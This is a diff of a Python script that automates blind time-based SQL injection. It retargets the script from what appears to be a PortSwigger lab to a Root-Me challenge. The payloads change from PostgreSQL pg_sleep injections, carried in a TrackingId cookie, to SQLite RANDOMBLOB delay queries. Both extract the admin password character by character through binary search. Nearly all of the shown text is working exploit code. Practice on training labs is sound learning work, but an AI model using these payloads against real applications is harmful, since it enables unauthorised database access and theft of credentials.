@@ -15,7 +15,7 @@ def get_password_with_time_based_SQLi():
     indice = 1 #use to change the indice of the password 
     result = [] #list all the found character 
     success = True 
-    url = 'https://0ae500170331f78f819016b700cc00ec.web-security-academy.net/'
+    url = 'http://challenge01.root-me.org/web-serveur/ch10/'
 
     while indice <= 20: #we assume that the password have 20 character
         if success: #initialisation of all variable used during the process
@@ -30,20 +30,18 @@ def get_password_with_time_based_SQLi():
             success = False
 
         while low_bound <= high_bound:
-            bad_sql1 = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{indice},1){payload_parameter1})+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--"
-            bad_sql2 = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{indice},1){payload_parameter2})+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--"
-            cookies1 = {
-                    'TrackingId': f"fB9J2RsSX689hMrs{bad_sql1}",
-                    'session': '0X8YTwxxvaofNjSdRQCu3ajIc9mpQP95'
-                    }
-            cookies2 = {
-                    'TrackingId': f"fB9J2RsSX689hMrs{bad_sql2}",
-                    'session': '0X8YTwxxvaofNjSdRQCu3ajIc9mpQP95'
-                    }
+            bad_sql1 = f"'+AND+(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,{indice},1)+FROM+users+WHERE+username='admin'){payload_parameter1}+THEN+1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))+ELSE+null+END)--"
+            bad_sql2 = f"'+AND+(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,{indice},1)+FROM+users+WHERE+username='admin'){payload_parameter2}+THEN+1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))+ELSE+null+END)--"
+            cookie1 = {
+                    ...
+                    }   
+            cookie2 = {
+                    ...
+                    }   
             output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
             output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
             output_message(f"[++] Index number : {indice}")
-            result_bool, result_contol= sending_payload_for_time_based_SQLi_getv(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
+            result_bool, result_contol= sending_payload_for_time_based_SQLi_getv(payload_parameter1, payload_parameter2, url, indice, cookie1, cookie2)
             print(f"Result_bool: {result_bool}, Result_control: {result_contol}\n")
             
             if result_contol == True:
